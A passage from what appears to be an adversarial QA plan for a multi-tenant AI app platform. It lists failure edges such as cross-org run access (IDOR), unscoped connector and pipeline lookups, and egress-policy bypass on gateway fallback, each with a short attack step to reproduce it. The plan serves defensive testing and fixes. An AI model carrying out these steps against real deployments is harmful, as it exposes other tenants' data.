   - Agent run marked error (answer = null).
   - Step marked error; subsequent steps skipped (or app halts).
4. **Fallback:** If pipeline has a fallback model (routing.fallback), the resolver could attempt a retry to the fallback gateway. Currently, fallback is NOT automatically tried on error (only on a routing rule decision, not on execution failure).
5. **Result:** App fails; user sees error.

**Subsystem seams crossed:**
- Agent step → gateway fetch (timeout at 20s, no automatic fallback on error).
- Gateway failure → error propagation (executor marks step error, run halts).

**Terminal artifact:** AppRun with status error, trace shows agent step failed with "gateway unreachable".

**Failure edges:**
1. **No automatic fallback on gateway error** — policy/routing defines a fallback model, but the executor doesn't use it if the primary gateway fails. A downed primary doesn't trigger automatic fallback; the app fails. *Attack:* kill primary gateway, run app, verify run fails (should attempt fallback).
2. **Egress leash not re-evaluated on fallback** — if the primary is on-prem (local) and the fallback is cloud, a local-egress policy should block the fallback attempt. If fallback doesn't re-check egress, the data can egress even though the policy forbids it. *Attack:* local-egress pipeline, on-prem gateway down, fallback to cloud, verify egress check rejects fallback attempt.
3. **Cost accrued on failed attempt** — if the gateway call fails mid-inference (after tokens consumed), the cost is still accrued. If fallback is attempted, the cost is double (primary + fallback). *Attack:* gateway timeout mid-inference, observe FinOps cost for the failed call.
4. **Timeout propagates, but step not retried** — a step times out (activity timeout in Temporal is 20s by default, fetch timeout is 20s). No automatic retry; the run fails. Contrast: Temporal activity retry is configurable; it's not applied here. *Attack:* inject latency into gateway (tc delay), trigger timeouts, verify step fails (no automatic retry).

---

### Journey 6.4: Tenant switch mid-session, cross-org leakage

**Steps:**
1. **Multi-org user** (e.g., contractor working for orgs A and B) logs in; session cookie is org-scoped (per SERVER_STATE / auth.ts).
2. **User opens app in org A** → runs the app → app step queries org A's connector.
3. **User manually switches org** (sidebar, or direct URL navigation to org B).
4. **In-flight run from org A** — the browser still has the original run's ID; user could navigate back to `/app/[slug]/runs/[id]` for org A's run while their session org is now B.
5. **Access control:** The route must check that the run's orgId matches the session orgId. If it doesn't, return 401/403.

**Subsystem seams crossed:**
- Session org → run access (run route must verify orgId).
- Org navigation → run visibility (leftover URLs from a different org must not leak data).

**Terminal artifact:** Either the run is visible (correct org), or 401/403 (wrong org).

**Failure edges:**
1. **Run accessible across org boundaries** (Cluster 1.1, issue #1; also Cluster 2.1, issue #1) — run route doesn't check orgId. A user in org B can fetch org A's run by ID (IDOR). *Attack:* multi-org user, fetch run ID from org A while session org is B, verify 401.
2. **Connector query crosses org** — during step execution, the executor resolves a data-domain from orgId in the run context. If the domain lookup doesn't scope to the run's orgId, a domain from org B can be resolved while executing a run in org A (IDOR). *Attack:* app in org A, create a domain in org B with the same name, trigger app, observe which domain is queried.
3. **Pipeline binding crosses org** — app.pipelineId can be any pipeline, even from a different org (if the resolver doesn't scope to orgId). Pipeline rules from org B apply to app in org A. *Attack:* create pipeline in org B, try to bind it to app in org A, verify it's rejected (should be org-scoped).

---

## Summary: Clusters + Key Failure-Edge Attacks

| Cluster | Journey | Top 3 Failure-Edge Attacks | Root Cause Class |
|---------|---------|---------------------------|-----------------|
| **1. BUILD→RUN→REVIEW→REPORT** | 1.1 NL→Run inline | 1. Cross-org connector leak | Org scope not threaded through executor seams |
| | | 2. HITL resume re-executes added sinks | State versioning: run built on old spec, executor drives new spec |
| | | 3. Cyclic app wedges forever | Validation skipped in pure module, only in canvas editor (DRY violation) |
| | 1.2 Schedule→HITL→Approve→Report | 1. Temporal worker restart duplicates side-effects | No idempotency key on app-run steps |
| | | 2. Cron saves invalid, never fires | Validation client-only, 2nd-stage at Kestra (no 1st-stage catch) |
| | | 3. Cost not accrued if run orphaned | Fanout via after() can be lost if run errors; not queued durably |
| **2. CONSUMPTION loop** | 2.1 Webhook→Run→Email | 1. Nested payload explosion | Top-level clamp only, nested structures unchecked |
| | | 2. Egress check doesn't know org context | selectEmailProvider infers org, can mismatch webhook intent |
| | | 3. Email sent with degraded data if connector fails | Output step fires even if data step failed; no dependency/validation |
| | 2.2 Schedule batch runs | 1. Cron invalid, silently never fires | Client-side validation, 2nd-stage Kestra catch |
| | | 2. FinOps double-count on retry | Cost accrued per activity invocation, no dedup on re-try |
| | | 3. Drift analysis skips run if fanout fails | Observability fanout best-effort, gaps not detected |
| **3. DATA→GROUNDING** | 3.1 Connector→ETL→Brain→Chat | 1. Cross-tenant RAG doc leak | retrieve() filters project_id only, no org_id; chat stream doesn't check org |
| | | 2. DAG with cycle/missing connector runs as success | validateDagSpec client-only, PATCH skips validation, Kestra compiles to 0 steps |
| | | 3. Warehouse reads cross org | queryWarehouse() org-unscoped, `db.table` syntax allows cross-database reads |
| **4. GOVERNANCE SET-ONCE** | 4.1 Admin policy inherited | 1. Deprecated pipeline still governs | resolveContract skips lifecycle-status filter, no fallback to org default |
| | | 2. Draft pipeline runs on internal consumers | Only PUBLIC route checks published; CHAT/AGENT/APP skip check |
| | | 3. Policy enforcement duplicated per path | Ad-hoc enforcement, one path fails-open, others fail-closed (DRY) |
| **5. ADMIN→OPERATOR** | 5.1 Pipeline delegation, team access | 1. Viewer can write via API bypass | API routes don't check requireAdmin; UI hides button but API allows |
| | | 2. Budget enforcement per key, not per run | Budget checked only at key creation, not enforced at run time |
| | | 3. ABAC deny overridden by RBAC allow | RBAC checked first, ABAC skipped if RBAC allows (order matters) |
| **6. INTERRUPT/RECOVERY** | 6.1 Cancel mid-step | 1. Durable activity not aborted on browser cancel | Temporal activity runs to completion despite browser AbortSignal |
| | | 2. Run persists even if user never sees result | User may re-run same input, causing duplicate side-effects |
| | | 3. Step persisted mid-transaction | DB connection dies mid-persist; subsequent run re-executes or skips (no idempotency) |
| | 6.2 HITL orphaned | 1. No timeout on approval pause | Workflow condition indefinite; run stuck awaiting_human forever |
| | | 2. Approval signal not idempotent | Concurrent approvals fire multiple resume signals; downstream re-executes |
| | | 3. Notification single-attempt | Email lost; approver never notified; no retry, digest, or Slack fallback |
| | 6.3 Gateway degraded | 1. No automatic fallback on gateway error | Primary gateway fails; routing.fallback not attempted; app fails |
| | | 2. Egress leash not re-evaluated on fallback | Fallback to cloud not checked against local-egress policy |
| | | 3. Cost accrued on failed attempt | Failed inference still costs; no dedup on retry |
| | 6.4 Tenant switch | 1. Run accessible across orgs (IDOR) | Run route doesn't check orgId; multi-org user fetches other org's run |
| | | 2. Connector query crosses org | Domain lookup not org-scoped; wrong org's domain resolved |
| | | 3. Pipeline binding crosses org | App.pipelineId not org-scoped; pipeline from other org applies |

---

## Cross-Cutting Root Causes (why fixes cluster)

1. **ENFORCEMENT ON SHARED SEAMS, NOT AD HOC PER PATH** — guardrail fail-open (chat) vs fail-closed (agent), lifecycle-status check (public route only), org-scope applied per route (present in some, missing in others). **Fix:** ONE enforced fail-closed seam (guardrail, policy, org-scope) all consumers use.

2. **VALIDATION SKIPPED ON PATCH/EDIT** — connector PATCH validates nothing, ETL DAG PATCH skips validateDagSpec, cron saved without server-side check. **Fix:** server-side re-validation on all mutations (POST + PATCH + DELETE).

3. **STATE VERSIONING / IDEMPOTENCY** — HITL resume uses current spec not version-N, app-run step persisted mid-transaction, activity retry costs twice. **Fix:** run binds spec version at start, steps are idempotent (or include idempotency key), cost deduped on retry.

4. **OBSERVABILITY FANOUT BEST-EFFORT** — async fanout (after(), Temporal activity) can fail silently; run persists but audit/cost/drift entries don't. **Fix:** audit + cost writes inline (transactional), drift async but with reconciliation pass.

5. **SCOPE NOT THREADED** — org-scope inferred at each seam, mismatches (connector org ≠ run org). **Fix:** org context threaded as first-class parameter, not inferred per route.

6. **DRY VIOLATIONS** — guardrail invocation copy-pasted, cron validation in 3 places, rate-limit normalization in 3 places. **Fix:** extract to pure helpers, reused everywhere.

---

## Next Steps for Adversarial QA

1. **For each cluster:** Launch a per-cluster adversarial agent. It writes reproducer tests + fixes for each failure-edge attack above.
2. **Prioritize by blast radius:** Cluster 3 (DATA) and 4 (GOVERNANCE) have org-isolation + leak risks — start there.
3. **Check for seams:** For each fix, verify the enforcement seam is ONE place, all consumers use it (no copy-paste).
4. **Verify live:** After each fix lands, run the reproducer + an integration pass to confirm the attack no longer works.

